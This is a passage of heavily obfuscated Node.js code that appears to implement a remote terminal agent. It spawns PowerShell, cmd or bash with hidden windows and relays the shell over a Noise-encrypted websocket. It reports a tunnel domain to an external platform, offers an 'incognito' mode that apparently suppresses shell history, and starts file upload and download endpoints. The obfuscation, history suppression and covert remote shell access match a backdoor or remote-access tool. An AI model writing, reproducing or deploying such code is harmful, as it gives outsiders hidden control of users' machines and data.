            }), b['on'](a[mU(0x133)], () => {
            });
        } catch (c) {
        }
    }
    static ['activate'](a) {
        const mW = a0d0, b = {
                'arTOv': function (c, d) {
                    return c === d;
                },
                'byack': function (c, d) {
                    return c === d;
                },
                'Uofiw': function (c, d) {
                    return c + d;
                },
                'czwoP': function (c, d) {
                    return c + d;
                },
                'slioN': mW(0xc39),
                'vVOvF': ':\x20隧道域名将上报至外部平台',
                'YZdiL': mW(0x154),
                'Ygdfn': mW(0xdcb),
                'XKAQL': mW(0xd57)
            };
        if (b[mW(0x27e)](a0ax['KMODE'], '2') && this['knameValid']()) {
            const c = b[mW(0x658)](a0ax[mW(0xbe7)], !![]);
            a0R[mW(0x6e3)](b[mW(0xc9d)](b['Uofiw'](b['czwoP'](b[mW(0x744)], c ? 'q' : ''), b[mW(0x80f)]), c ? b[mW(0x937)] : '')), a[mW(0x7c1)] = (d, f) => {
                const mX = mW;
                this[mX(0xe9f)](f);
            }, a[mW(0xb96)](a0ax[mW(0xb49)], ![], c, { 'source': b[mW(0xe71)] })[mW(0x9f0)](d => this[mW(0x58c)](d[mW(0x249)]))[mW(0xef4)](() => {
            });
            return;
        }
        a0R[mW(0x6e3)](b[mW(0xba9)]), a[mW(0x7c1)] = (d, f) => {
            this['writeDomainFile'](f);
        }, a[mW(0xb96)](a0ax[mW(0xb49)], ![], ![], { 'source': b['Ygdfn'] })[mW(0x9f0)](d => {
            const mY = mW;
            this[mY(0xd23)](d[mY(0x249)]);
        })[mW(0xef4)](d => {
            const mZ = mW;
            a0R[mZ(0x9cd)](mZ(0xd48)[mZ(0x7b6)](d[mZ(0xf18)]));
        }), this[mW(0xe97)]();
    }
}
const a0cL = a0d0(0x595);
function a0cM(a) {
    const n0 = a0d0;
    return ''['concat'](a0ax[n0(0x39e)] || '', '-')[n0(0x7b6)](a);
}
function a0cN(a) {
    const n1 = a0d0;
    return ''[n1(0x7b6)](a)['concat'](a0cL);
}
function a0cO(a, b = null, c = null) {
    const n2 = a0d0, d = {
            'HJjPw': function (h, i) {
                return h === i;
            },
            'XyjKf': function (h, i) {
                return h === i;
            },
            'xCLjE': function (h, i) {
                return h < i;
            },
            'JlPMX': 'KNAME\x20含非法字符\x20(限字母数字及\x20+_-[]*$=@,;/)',
            'AbhvM': function (h, i) {
                return h === i;
            },
            'nBlgA': function (h, i) {
                return h(i);
            },
            'qkMsu': function (h, i) {
                return h < i;
            },
            'jFVnz': n2(0xc73)
        };
    let f;
    if (d[n2(0xbf6)](b, null) || d[n2(0x53e)](b, undefined)) {
        const h = a0ax[n2(0x39e)] || '';
        if (d[n2(0x254)](h['length'], 0x3))
            return n2(0xf15)[n2(0x7b6)](h[n2(0x615)], n2(0x413));
        if (!a0cK[n2(0xef5)][n2(0xdbb)](h))
            return d[n2(0x9f6)];
        f = ''['concat'](h, '-')[n2(0x7b6)](a);
    } else
        f = String(b);
    const g = d[n2(0x3aa)](c, null) || c === undefined ? d['nBlgA'](a0cN, f) : String(c);
    if (d[n2(0xd8c)](f[n2(0x615)], 0x3))
        return '上报名过短\x20('[n2(0x7b6)](f[n2(0x615)], n2(0x490));
    if (!a0cK['_SHZAL_NAME_CHARS'][n2(0xdbb)](f))
        return d[n2(0x683)];
    if (d[n2(0xd8c)](g[n2(0x615)], 0x8))
        return n2(0x984)['concat'](g[n2(0x615)], '<8,\x20shz.al\x20平台密码约束)');
    return null;
}
let a0cP = null, a0cQ = null;
const a0cR = new Promise((a, b) => {
    const n3 = a0d0, c = {
            'UGwhU': '[WARN]\x20Noise\x20WASM\x20module\x20failed\x20to\x20load:',
            'PltGz': n3(0x9b8),
            'hVvUL': function (d, f) {
                return d(f);
            },
            'zqIFO': n3(0x575)
        };
    try {
        c[n3(0x6f7)](a0y, function (d) {
            const n4 = n3;
            if (!d) {
                a0cQ = new Error('Failed\x20to\x20load\x20noise-c.wasm\x20module'), a0R[n4(0x9cd)](c['UGwhU'], a0cQ[n4(0xf18)]), a();
                return;
            }
            a0cP = d, a0R['debug'](c[n4(0x14b)]), a();
        });
    } catch (d) {
        a0cQ = d, a0R[n3(0x9cd)](c[n3(0x5df)], d[n3(0xf18)]), a();
    }
});
process['on'](a0d0(0x2d8), (a, b) => {
    const n5 = a0d0, c = { 'bTchG': n5(0x6db) };
    a0R[n5(0x755)](c[n5(0xaf)], a);
}), process['on']('uncaughtException', a => {
    const n6 = a0d0, b = { 'hYvve': 'Uncaught\x20Exception:' };
    a0R[n6(0x755)](b[n6(0xf00)], a), process[n6(0x9e4)](0x1);
});
class a0cS {
    constructor(a, b, c) {
        const n7 = a0d0, d = { 'TwMye': n7(0x90c) }, f = d[n7(0x1b3)]['split']('|');
        let g = 0x0;
        while (!![]) {
            switch (f[g++]) {
            case '0':
                this[n7(0x895)] = a;
                continue;
            case '1':
                this[n7(0xde9)] = null;
                continue;
            case '2':
                this[n7(0x9cb)] = c;
                continue;
            case '3':
                this['hs'] = null;
                continue;
            case '4':
                this[n7(0x98c)] = ![];
                continue;
            case '5':
                this['recvCipher'] = null;
                continue;
            case '6':
                this[n7(0x848)] = b;
                continue;
            }
            break;
        }
    }
    async [a0d0(0x676)]() {
        const n8 = a0d0, a = {
                'jVhlx': n8(0x502),
                'ZcwCB': n8(0xc75)
            };
        await a0cR;
        if (!a0cP)
            throw a0cQ || new Error(a[n8(0xd43)]);
        const b = a0cP, c = this[n8(0x895)] ? b[n8(0x8e0)]['NOISE_ROLE_INITIATOR'] : b[n8(0x8e0)][n8(0x30d)];
        this['hs'] = b[n8(0x341)](n8(0xa4c), c);
        const d = Buffer['from']('kisama_terminal_v1'), f = this[n8(0x848)] ? Buffer[n8(0x58d)](this[n8(0x848)], a[n8(0xe5c)]) : null, g = this[n8(0x9cb)] ? Buffer[n8(0x58d)](this['expectedRemotePubB64'], a['ZcwCB']) : null;
        this['hs'][n8(0x853)](d, f, g, null);
    }
    [a0d0(0xec9)](a) {
        const n9 = a0d0, b = {
                'VKwVN': function (d, f) {
                    return d === f;
                },
                'mLbca': function (d, f) {
                    return d === f;
                }
            };
        if (this[n9(0x98c)])
            return Buffer[n9(0xacf)](0x0);
        const c = a0cP;
        a && a['length'] > 0x0 && b[n9(0x1ab)](this['hs'][n9(0x44d)](), c[n9(0x8e0)][n9(0x5c4)]) && this['hs'][n9(0x30f)](a);
        if (b[n9(0x1ab)](this['hs'][n9(0x44d)](), c[n9(0x8e0)][n9(0xcdc)]))
            return this[n9(0x36d)](), Buffer[n9(0xacf)](0x0);
        if (b[n9(0x1ab)](this['hs'][n9(0x44d)](), c[n9(0x8e0)][n9(0x883)])) {
            const d = this['hs'][n9(0xc30)](new Uint8Array(0x0));
            return b['mLbca'](this['hs'][n9(0x44d)](), c[n9(0x8e0)][n9(0xcdc)]) && this[n9(0x36d)](), Buffer[n9(0x58d)](d);
        }
        return Buffer[n9(0xacf)](0x0);
    }
    [a0d0(0x36d)]() {
        const na = a0d0, a = {
                'kPNlm': function (g, h) {
                    return g === h;
                },
                'IryJt': 'Noise\x20peer\x20static\x20key\x20verification\x20failed'
            };
        let b = null;
        try {
            b = this['hs'][na(0xc3e)]();
        } catch (g) {
            b = null;
        }
        const c = this[na(0x9cb)] ? Buffer['from'](this[na(0x9cb)], na(0xc75)) : null, d = b && c && a[na(0xc0c)](b[na(0x615)], c[na(0x615)]) && a0k[na(0x5d4)](Buffer[na(0x58d)](b), c);
        if (!d)
            throw new Error(a[na(0x870)]);
        const f = this['hs'][na(0x3ac)]();
        this[na(0xde9)] = f[0x0], this[na(0x9a7)] = f[0x1], this[na(0x98c)] = !![];
        try {
            if (this['hs'])
                this['hs']['free']();
        } catch (h) {
        }
        this['hs'] = null;
    }
    [a0d0(0xce2)](a) {
        const nb = a0d0;
        if (!this['handshakeFinished'])
            throw new Error('握手未完成，无法加密数据');
        const b = new Uint8Array(0x0), c = new Uint8Array(a);
        return Buffer[nb(0x58d)](this[nb(0xde9)][nb(0x1b7)](b, c));
    }
    [a0d0(0xeb3)](a) {
        const nc = a0d0, b = { 'aYRbI': nc(0x993) };
        if (!this[nc(0x98c)])
            throw new Error(b[nc(0xb1d)]);
        const c = new Uint8Array(0x0), d = new Uint8Array(a);
        return Buffer[nc(0x58d)](this['recvCipher'][nc(0xa3f)](c, d));
    }
    ['free']() {
        const nd = a0d0, a = { 'poeWR': '1|0|2|5|4|3' }, b = a[nd(0x37b)][nd(0xc0)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                try {
                    if (this[nd(0x9a7)])
                        this[nd(0x9a7)][nd(0x105)]();
                } catch (d) {
                }
                continue;
            case '1':
                try {
                    if (this['sendCipher'])
                        this[nd(0xde9)]['free']();
                } catch (f) {
                }
                continue;
            case '2':
                try {
                    if (this['hs'])
                        this['hs'][nd(0x105)]();
                } catch (g) {
                }
                continue;
            case '3':
                this['hs'] = null;
                continue;
            case '4':
                this[nd(0x9a7)] = null;
                continue;
            case '5':
                this[nd(0xde9)] = null;
                continue;
            }
            break;
        }
    }
}
class a0cT {
    constructor(a, b, c, d) {
        const ne = a0d0;
        this[ne(0x8ad)] = a, this[ne(0xb2e)] = b, this['cwd'] = c, this[ne(0x625)] = d || [], this[ne(0x390)] = null, this[ne(0xa28)] = 0x0, this[ne(0x5b1)] = null, this['_onExitCb'] = null;
    }
    [a0d0(0x905)]() {
        const nf = a0d0, a = {
                'zBzEV': function (c, d) {
                    return c || d;
                },
                'fCfZD': function (c, d, f, g) {
                    return c(d, f, g);
                },
                'zBSiJ': nf(0x275),
                'mWSXh': nf(0x426),
                'zzmfD': nf(0x9e4)
            };
        this[nf(0x390)] = a['fCfZD'](a0s, this[nf(0x8ad)], this['args'], {
            'env': this['env'],
            'cwd': this[nf(0xc50)],
            'windowsHide': !![],
            'stdio': [
                a['zBSiJ'],
                a['zBSiJ'],
                'pipe'
            ]
        }), this[nf(0xa28)] = this[nf(0x390)][nf(0xa28)] || 0x0;
        const b = this;
        this[nf(0x390)][nf(0x9a6)]['on'](nf(0x426), c => b['_emitData'](c)), this['proc']['stderr']['on'](a['mWSXh'], c => b['_emitData'](c)), this['proc']['on'](a[nf(0x266)], (c, d) => {
            const ng = nf;
            if (b[ng(0xb94)])
                b['_onExitCb']({
                    'exitCode': c,
                    'signal': a[ng(0x351)](d, null)
                });
        });
    }
    [a0d0(0x9c7)](a) {
        const nh = a0d0, b = { 'hCkit': nh(0x920) };
        if (this[nh(0x5b1)])
            this[nh(0x5b1)](a[nh(0xa27)](b[nh(0x3c1)]));
    }
    [a0d0(0xad9)](a) {
        const ni = a0d0;
        return this[ni(0x5b1)] = a, {
            'dispose': () => {
                this['_onDataCb'] = null;
            }
        };
    }
    [a0d0(0x6ef)](a) {
        return this['_onExitCb'] = a, {
            'dispose': () => {
                const nj = a0b;
                this[nj(0xb94)] = null;
            }
        };
    }
    [a0d0(0x5a6)](a) {
        const nk = a0d0;
        if (!this[nk(0x390)] || !this[nk(0x390)][nk(0xe84)])
            return;
        try {
            this[nk(0x390)][nk(0xe84)][nk(0x5a6)](a);
        } catch (b) {
        }
    }
    [a0d0(0x582)]() {
    }
    [a0d0(0x438)]() {
        const nl = a0d0;
        try {
            if (this[nl(0x390)])
                this['proc'][nl(0x438)]();
        } catch (a) {
        }
    }
}
class a0cU {
    constructor() {
        const nm = a0d0, a = { 'ScJtf': 'handshake' };
        this[nm(0x3fc)] = null, this[nm(0xbcf)] = null, this[nm(0x7dd)] = null, this[nm(0x2bb)] = !![], this[nm(0x6e2)] = ![], this[nm(0xa0c)] = ![], this[nm(0x5e4)] = a[nm(0x8c4)], this[nm(0x995)] = [], this[nm(0xb06)] = [], this[nm(0x917)] = a0ax[nm(0x2a1)][nm(0x47e)]['private_b64'], this[nm(0x22c)] = a0ax[nm(0x2a1)]['control'][nm(0xc1a)], this['cipher'] = new a0cS(![], this[nm(0x917)], this[nm(0x22c)]);
    }
    async [a0d0(0xadb)]() {
        const nn = a0d0, a = {
                'ehbkH': function (b, c) {
                    return b === c;
                },
                'HxxQg': nn(0xb9a),
                'hsmhE': function (b, c) {
                    return b === c;
                },
                'HmcpY': 'Cleanly\x20closed'
            };
        this[nn(0x7dd)] && a0R['info']('['[nn(0x7b6)](this[nn(0x7dd)], nn(0xe91)));
        if (this[nn(0x3fc)]) {
            a[nn(0xe11)](process[nn(0x109)], a['HxxQg']) && this[nn(0x3fc)]['pid'] && this[nn(0x7e6)](this[nn(0x3fc)]['pid']);
            try {
                this[nn(0x3fc)][nn(0x438)]();
            } catch (b) {
            }
            this[nn(0x3fc)] = null;
        }
        if (this[nn(0x4a5)])
            this[nn(0x4a5)]['free']();
        if (this[nn(0xbcf)])
            try {
                a[nn(0x5b7)](this['websocket']['readyState'], this[nn(0xbcf)]['OPEN']) && this[nn(0xbcf)]['close'](0x3e8, a['HmcpY']);
            } catch (c) {
            } finally {
                this['websocket'] = null;
            }
    }
    ['_taskkillTree'](a) {
        const no = a0d0;
        try {
            a0r(no(0xc15)['concat'](a), { 'windowsHide': !![] }, () => {
            });
        } catch (b) {
        }
    }
    ['_handleRawMessage'](a) {
        const np = a0d0, b = {
                'LFdpb': function (c, d) {
                    return c === d;
                },
                'HupqF': function (c, d) {
                    return c > d;
                },
                'SGZrc': function (c, d) {
                    return c === d;
                },
                'vqqUQ': np(0x900)
            };
        if (b[np(0x150)](this[np(0x5e4)], 'handshake')) {
            if (b[np(0x464)](this[np(0xb06)][np(0x615)], 0x0)) {
                const c = this[np(0xb06)]['shift']();
                c(a);
            } else
                this[np(0x995)]['push'](a);
        } else
            b[np(0xb0a)](this['phase'], b[np(0x9fe)]) && this['_processTerminalMessage'](a);
    }
    async [a0d0(0xfc)]() {
        const nq = a0d0, a = {
                'xXmZL': function (b, c) {
                    return b > c;
                }
            };
        if (a[nq(0x680)](this[nq(0x995)][nq(0x615)], 0x0))
            return this[nq(0x995)][nq(0x99b)]();
        return new Promise(b => {
            this['msgResolvers']['push'](b);
        });
    }
    async [a0d0(0x18a)](a) {
        const nr = a0d0, b = {
                'CrpcQ': nr(0x7a9),
                'ukjsO': function (c, d) {
                    return c > d;
                },
                'frBxK': nr(0xd74),
                'AVPtw': function (c, d) {
                    return c(d);
                },
                'kwLjX': nr(0x78e)
            };
        a(b[nr(0x344)]);
        try {
            await this[nr(0x4a5)][nr(0x676)]();
            const c = await this[nr(0xfc)](), d = this[nr(0x4a5)][nr(0xec9)](c);
            d && b[nr(0xc92)](d[nr(0x615)], 0x0) && this[nr(0xbcf)][nr(0xb36)](d);
            const f = await this[nr(0xfc)]();
            this[nr(0x4a5)][nr(0xec9)](f);
            if (!this[nr(0x4a5)]['handshakeFinished'])
                throw new Error(b['frBxK']);
            b[nr(0xa18)](a, b[nr(0x459)]);
        } catch (g) {
            b[nr(0xa18)](a, nr(0xefd)[nr(0x7b6)](g[nr(0xf18)]));
            throw new Error(nr(0x376));
        }
    }
    [a0d0(0x260)]() {
        const ns = a0d0, a = {
                'nCnca': function (d, f) {
                    return d === f;
                },
                'TiUGJ': ns(0xb9a),
                'kXmOc': 'WindowsPowerShell',
                'AsMMp': ns(0xb93),
                'MKmfL': ns(0x915),
                'spGkq': 'System32',
                'BapgY': ns(0x687),
                'JIjbN': ns(0xa0d),
                'ldAKL': ns(0x8a0),
                'eOPiB': ns(0x72c)
            };
        if (a[ns(0x752)](process['platform'], a[ns(0x38d)])) {
            const d = process.env.SystemRoot || ns(0x524), f = [
                    a0o[ns(0x782)](d, ns(0x81c), a[ns(0xac9)], a[ns(0x1fc)], a[ns(0xdaf)]),
                    process.env.COMSPEC,
                    a0o[ns(0x782)](d, a[ns(0xd87)], ns(0x687))
                ];
            for (const g of f) {
                if (g && a0l[ns(0x7d2)](g))
                    return g;
            }
            return a['BapgY'];
        }
        const b = [
            a[ns(0x835)],
            a[ns(0x2c7)],
            ns(0x417)
        ];
        for (const h of b) {
            if (a0l['existsSync'](h))
                return h;
        }
        const c = process.env.SHELL;
        if (c && a0l[ns(0x7d2)](c))
            return c;
        return a[ns(0x185)];
    }
    async [a0d0(0xb51)](a, b, c, d = ![], f = ![]) {
        const nt = a0d0, g = {
                'LaAHw': function (i, j) {
                    return i(j);
                },
                'bhbMh': nt(0x2e1),
                'AysDe': nt(0xf18),
                'VCNrz': function (i, j) {
                    return i(j);
                }
            };
        this['websocket'] = a, this[nt(0x7dd)] = b, this['metaRequested'] = d, this[nt(0xa0c)] = f;
        const h = i => a0R['info'](nt(0x414)[nt(0x7b6)](b, ']\x20')[nt(0x7b6)](i));
        this[nt(0x2bb)] = !c, g[nt(0xe57)](h, this[nt(0x2bb)] ? nt(0xdc0) : g[nt(0xc89)]), a['on'](g[nt(0x897)], i => this['_handleRawMessage'](i));
        try {
            this['useNoise'] && await this['_doNoiseHandshake'](h), await this[nt(0x586)](h);
        } catch (i) {
            g[nt(0xdc9)](h, '❌\x20终端会话异常:\x20'[nt(0x7b6)](i[nt(0xf18)])), await this[nt(0xadb)]();
        }
    }
    async ['_runTerminal'](a) {
        const nu = a0d0, b = {
                'SbWlo': nu(0x920),
                'eVutm': function (h, i) {
                    return h(i);
                },
                'ZKeZK': nu(0x1e2),
                'XGMCJ': function (h, i) {
                    return h === i;
                },
                'pLHNM': 'linux',
                'xMFqL': function (h) {
                    return h();
                },
                'VkKNL': function (h, i) {
                    return h || i;
                },
                'XPLCE': nu(0x131),
                'xwlhK': nu(0xdf4),
                'hZlnq': nu(0xb9a),
                'iQPwU': '/dev/null',
                'JwUtj': nu(0xd6d),
                'iwhqj': '-Command',
                'CutSM': function (h, i) {
                    return h(i);
                },
                'hwvDp': nu(0xe8a),
                'LfShl': nu(0x900),
                'PThqc': nu(0xd81)
            };
        b[nu(0x631)](process[nu(0x109)], b['pLHNM']) && b[nu(0x631)](typeof Bun, nu(0xcb1)) && !a0C && !a0D && await b[nu(0xabe)](a0Q);
        if (!a0C) {
            const h = b[nu(0x8da)](a0D, nu(0x3af));
            a(nu(0xdfe)['concat'](h));
            try {
                this[nu(0xbcf)][nu(0xd81)](0x3f3, a0H);
            } catch (i) {
            }
            throw new Error(h);
        }
        const c = this[nu(0x260)]();
        b[nu(0x8d7)](a, nu(0x8a9)[nu(0x7b6)](c));
        const d = Object['assign']({}, process.env);
        delete d['PROMPT_COMMAND'], d['TERM'] = b['XPLCE'];
        if (!d['LANG'])
            d['LANG'] = b['xwlhK'];
        this['incognitoRequested'] && process[nu(0x109)] !== b[nu(0x956)] && (d[nu(0x5f0)] = b[nu(0x26d)]);
        const f = this['incognitoRequested'] && b[nu(0x631)](process[nu(0x109)], b['hZlnq']) && b[nu(0x631)](a0o[nu(0x2ed)](c)[nu(0x777)](), nu(0x915)) ? [
                b[nu(0xcf4)],
                b[nu(0x919)],
                nu(0x5de)
            ] : [], g = a0S();
        try {
            const j = {
                'name': b[nu(0x373)],
                'cols': 0x50,
                'rows': 0x18,
                'cwd': g,
                'env': d
            };
            if (b['XGMCJ'](process['platform'], b[nu(0x956)]))
                try {
                    this[nu(0x3fc)] = a0C[nu(0x905)](c, f, j);
                } catch (k) {
                    b[nu(0x1e4)](a, nu(0x709)[nu(0x7b6)](k[nu(0xf18)])), this[nu(0x3fc)] = new a0cT(c, d, g, f), this[nu(0x3fc)][nu(0x905)]();
                }
            else
                this[nu(0x3fc)] = a0C['spawn'](c, f, j);
            a(nu(0xde)['concat'](this[nu(0x3fc)]['pid'] || b[nu(0x44e)], ')'));
            this[nu(0x6e2)] && this['_sendWelcome'](c);
            this[nu(0x5e4)] = b['LfShl'];
            while (this[nu(0x995)][nu(0x615)] > 0x0) {
                const l = this['msgQueue']['shift']();
                this['_processTerminalMessage'](l);
            }
            this[nu(0x3fc)]['onData'](m => {
                const nv = nu;
                try {
                    let n = Buffer[nv(0x58d)](m, b['SbWlo']);
                    this[nv(0x2bb)] && this['cipher'] && this[nv(0x4a5)][nv(0x98c)] && (n = this[nv(0x4a5)][nv(0xce2)](n)), this[nv(0xbcf)][nv(0x37e)] === 0x1 && this[nv(0xbcf)][nv(0xb36)](n);
                } catch (o) {
                }
            }), this[nu(0x3fc)]['onExit'](({
                exitCode: m,
                signal: n
            }) => {
                const nw = nu;
                b[nw(0x8d7)](a, nw(0x204)[nw(0x7b6)](m, ',\x20Signal:\x20')[nw(0x7b6)](n, ')')), this['cleanup']();
            }), this[nu(0xbcf)]['on'](b[nu(0xba5)], () => {
                const nx = nu;
                a(b[nx(0xd59)]), this[nx(0xadb)]();
            });
        } catch (m) {
            a(nu(0x9a8)[nu(0x7b6)](m[nu(0xf18)])), await this[nu(0xadb)]();
            throw m;
        }
    }
    static ['normalizeShellName'](a) {
        const ny = a0d0, b = {
                'cTAZD': function (d, f) {
                    return d(f);
                },
                'pxnEl': function (d, f) {
                    return d || f;
                },
                'cSGFE': function (d, f) {
                    return d || f;
                }
            };
        let c = a0o[ny(0x2ed)](b[ny(0x2de)](String, b[ny(0x692)](a, ''))[ny(0x27f)]())['toLowerCase']();
        if (c[ny(0x361)]('.exe'))
            c = c[ny(0x174)](0x0, -0x4);
        return b[ny(0xefe)](c, 'sh');
    }
    static ['incognitoNativeApplied'](a) {
        const nz = a0d0, b = {
                'ldvXh': function (c, d) {
                    return c === d;
                },
                'vtdsq': nz(0xb9a),
                'JRqsb': function (c, d) {
                    return c(d);
                },
                'DmaAC': function (c, d) {
                    return c || d;
                },
                'FeBBN': 'powershell.exe',
                'jsxtz': function (c, d) {
                    return c === d;
                }
            };
        if (b[nz(0x9f9)](process[nz(0x109)], b['vtdsq'])) {
            const c = a0o[nz(0x2ed)](b[nz(0x3d0)](String, b[nz(0xa11)](a, '')))[nz(0x777)]();
            return c === b[nz(0x4be)] || b['jsxtz'](c, 'cmd.exe');
        }
        return !![];
    }
    [a0d0(0xedb)](a) {
        const nA = a0d0, b = {
                'SxGVL': function (c, d) {
                    return c === d;
                }
            };
        try {
            let c = Buffer[nA(0x58d)](JSON[nA(0xbbe)]({
                'type': nA(0xe6d),
                'shell': a0cU['normalizeShellName'](a),
                'path': a,
                'incognito': !!(this['incognitoRequested'] && a0cU[nA(0x420)](a))
            }));
            this[nA(0x2bb)] && this[nA(0x4a5)] && this[nA(0x4a5)][nA(0x98c)] && (c = this['cipher'][nA(0xce2)](c)), this[nA(0xbcf)] && b['SxGVL'](this['websocket']['readyState'], 0x1) && this[nA(0xbcf)]['send'](c);
        } catch (d) {
        }
    }
    [a0d0(0x5ad)](a) {
        const nB = a0d0, b = {
                'Jospc': nB(0x920),
                'GJGbM': function (c, d) {
                    return c === d;
                },
                'jYPKe': nB(0xdde),
                'bJaAz': nB(0x582),
                'ArCeb': function (c, d) {
                    return c !== d;
                },
                'IEAKv': nB(0xc75)
            };
        if (!this[nB(0x3fc)])
            return;
        try {
            const c = Buffer[nB(0x58d)](a);
            let d;
            this['useNoise'] ? d = this[nB(0x4a5)][nB(0xeb3)](c) : d = c;
            let f = ![], g = d[nB(0xa27)](b['Jospc']);
            if (g['trim']()['startsWith']('{'))
                try {
                    const h = JSON[nB(0x766)](g);
                    f = !![];
                    if (b[nB(0x913)](h['type'], b[nB(0x279)])) {
                        let i = Buffer[nB(0x58d)](JSON[nB(0xbbe)]({ 'type': b[nB(0x279)] }));
                        if (this[nB(0x2bb)])
                            i = this[nB(0x4a5)][nB(0xce2)](i);
                        this['websocket'][nB(0xb36)](i);
                        return;
                    }
                    if (b[nB(0x913)](h['type'], b[nB(0x6aa)])) {
                        this[nB(0x3fc)][nB(0x582)](h[nB(0x726)] || 0x50, h[nB(0x745)] || 0x18);
                        return;
                    }
                    if (h['type'] === nB(0xe96) && b['ArCeb'](h['data'], undefined)) {
                        let j = b['GJGbM'](h[nB(0x2ee)], 'base64') ? Buffer[nB(0x58d)](h[nB(0x426)], b[nB(0xb6)])[nB(0xa27)]('utf-8') : h[nB(0x426)];
                        this[nB(0x3fc)]['write'](j);
                        return;
                    }
                } catch (k) {
                    f = ![];
                }
            !f && this[nB(0x3fc)]['write'](d[nB(0xa27)](b['Jospc']));
        } catch (l) {
            a0R[nB(0x6e3)](nB(0x414)[nB(0x7b6)](this['requestId'], nB(0x740))[nB(0x7b6)](l[nB(0xf18)]));
            if (this[nB(0x2bb)])
                this[nB(0xadb)]();
        }
    }
}
async function a0cV() {
    const nC = a0d0, a = {
            'aFPAA': nC(0x11a),
            'xkNjd': '@noble/curves/secp256k1.js'
        }, b = await import(a[nC(0x47f)]);
    a0A = b[nC(0xbc9)];
    const c = await import(a[nC(0x559)]);
    a0B = c['secp256k1'];
}
async function a0cW(a = {}) {
    const nD = a0d0, b = {
            'beoJu': 'Access-Control-Allow-Headers',
            'xcZta': 'content-type,\x20user-agent,\x20authorization,\x20x-nonce,\x20x-timestamp,\x20x-auth-token,\x20x-aes-encrypted,\x20x-debug,\x20x-file-path,\x20x-file-name,\x20x-chunk-id,\x20x-total-chunks',
            'GRsio': function (c) {
                return c();
            },
            'WIEqG': nD(0x865),
            'otSYs': 'GET,\x20POST,\x20PUT,\x20DELETE,\x20OPTIONS',
            'NSrCS': function (c, d) {
                return c === d;
            },
            'zaNZm': nD(0xa83),
            'jtGzX': nD(0xf1f),
            'uIruN': function (c) {
                return c();
            },
            'niTkx': nD(0xa35),
            'dtZzK': nD(0x34d),
            'aYVtp': nD(0x76f),
            'buGuq': '/config',
            'IIhMG': nD(0x9d3),
            'JPmHP': function (c, d) {
                return c === d;
            },
            'PkUdy': nD(0x8d5),
            'RpxDv': function (c, d) {
                return c === d;
            },
            'fRFrX': function (c, d) {
                return c(d);
            },
            'JkJLL': function (c, d) {
                return c !== d;
            },
            'OZBIr': 'string',
            'hQsat': function (c, d) {
                return c === d;
            },
            'YEyhT': nD(0x143),
            'pTWmG': function (c, d) {
                return c === d;
            },
            'wuuEQ': nD(0x836),
            'xeHeY': function (c, d) {
                return c(d);
            },
            'LOhvh': function (c, d) {
                return c(d);
            },
            'JoVpR': function (c, d) {
                return c === d;
            },
            'bJxcz': '2|3|1|4|0',
            'qMyXW': function (c, d) {
                return c / d;
            },
            'DNrjI': '🔄\x20[Cache]\x20Status\x20实时监控缓存已过期，已重新生成度量快照。',
            'wlwbC': function (c, d) {
                return c / d;
            },
            'GtdgD': function (c, d) {
                return c - d;
            },
            'AzPTE': nD(0xbc),
            'yFWBX': nD(0x755),
            'XtHQM': function (c, d) {
                return c === d;
            },
            'ukjYC': function (c, d) {
                return c === d;
            },
            'LIFsD': nD(0xbfb),
            'bFKYT': nD(0x37a),
            'QIeVp': nD(0x142),
            'lFSMI': nD(0x899),
            'jOoEV': nD(0x2c4),
            'AlZQX': function (c, d, f) {
                return c(d, f);
            },
            'eAXZd': function (c, d) {
                return c !== d;
            },
            'swnib': function (c, d, f) {
                return c(d, f);
            },
            'EYdpW': 'Invalid\x20binary\x20stream\x20request\x20body',
            'ZcHXP': nD(0x323),
            'RKcpV': 'x-original-path',
            'byWUX': 'application/octet-stream',
            'KfNFl': function (c, d) {
                return c === d;
            },
            'nTDzI': nD(0xc1),
            'hIPef': function (c, d) {
                return c > d;
            },
            'ukgml': function (c, d) {
                return c <= d;
            },
            'fBBJP': 'base64',
            'gDebZ': nD(0xb48),
            'ZlcnC': 'Download\x20encryption\x20failed',
            'tJAmt': nD(0xc4b),
            'ncBGj': nD(0x126),
            'CtFTd': function (c, d, f) {
                return c(d, f);
            },
            'XSqLT': function (c, d, f) {
                return c(d, f);
            },
            'yrSNb': nD(0x427),
            'ADzsx': function (c, d) {
                return c > d;
            },
            'iGCzb': function (c, d) {
                return c(d);
            },
            'wMUnk': 'invalid_hub',
            'FddOZ': nD(0x4fb),
            'LrVHC': 'dynamic',
            'YhGDU': nD(0xdfd),
            'SwUgm': function (c, d, f) {
                return c(d, f);
            },
            'VnTZC': function (c, d) {
                return c === d;
            },
            'XZcja': nD(0x15a),
            'RMnAp': function (c, d) {
                return c(d);
            },
            'GCLEL': function (c) {
                return c();
            },
            'YTZlw': function (c, d) {
                return c(d);
            },
            'fQkHP': function (c, d) {
                return c(d);
            },
            'nJtMU': function (c, d) {
                return c !== d;
            },
            'SBNPm': nD(0xe0b),
            'ICzxo': nD(0x461),
            'wzOHM': nD(0xcbd),
            'oDaNy': function (c) {
                return c();
            },
            'wSzCZ': function (c, d) {
                return c(d);
            },
            'Lkici': function (c, d) {
                return c !== d;
            },
            'VTTgj': nD(0xd4f),
            'ofSVC': nD(0xb59),
            'OSCvK': function (c, d) {
                return c(d);
            },
            'QzjjE': function (c, d, f) {
                return c(d, f);
            },
            'dkdzM': function (c, d) {
                return c < d;
            },
            'HVbPx': function (c, d) {
                return c > d;
            },
            'ASUAs': nD(0x7cc),
            'IeZIV': function (c, d) {
                return c + d;
            },
            'ZdexM': function (c, d) {
                return c + d;
            },
            'sdGJi': function (c, d) {
                return c * d;
            },
            'Jodei': function (c, d) {
                return c * d;
            },
            'tFoMY': nD(0x698),
            'ItpoZ': function (c, d) {
                return c === d;
            },
            'CmEux': nD(0xb60),
            'PXbHl': function (c, d) {
                return c === d;
            },
            'QDiJv': nD(0x4c1),
            'VMtik': function (c, d) {
                return c(d);
            },
            'ewrmW': function (c, d) {
                return c(d);
            },
            'BtRWi': function (c, d) {
                return c(d);
            },
            'DicyR': function (c, d) {
                return c < d;
            },
            'YuXSF': function (c, d) {
                return c > d;
            },
            'miKsf': nD(0x2dd),
            'UPZhE': function (c, d) {
                return c === d;
            },
            'RqkIu': function (c, d) {
                return c === d;
            },
            'TvUJu': nD(0x19e),
            'BBeCO': function (c, d) {
                return c === d;
            },
            'FCbzd': function (c, d) {
                return c === d;
            },
            'MlNyH': nD(0xd97),
            'dKAyr': function (c, d) {
                return c === d;
            },
            'KnWnP': function (c, d) {
                return c === d;
            },
            'KCbHy': function (c, d) {
                return c === d;
            },
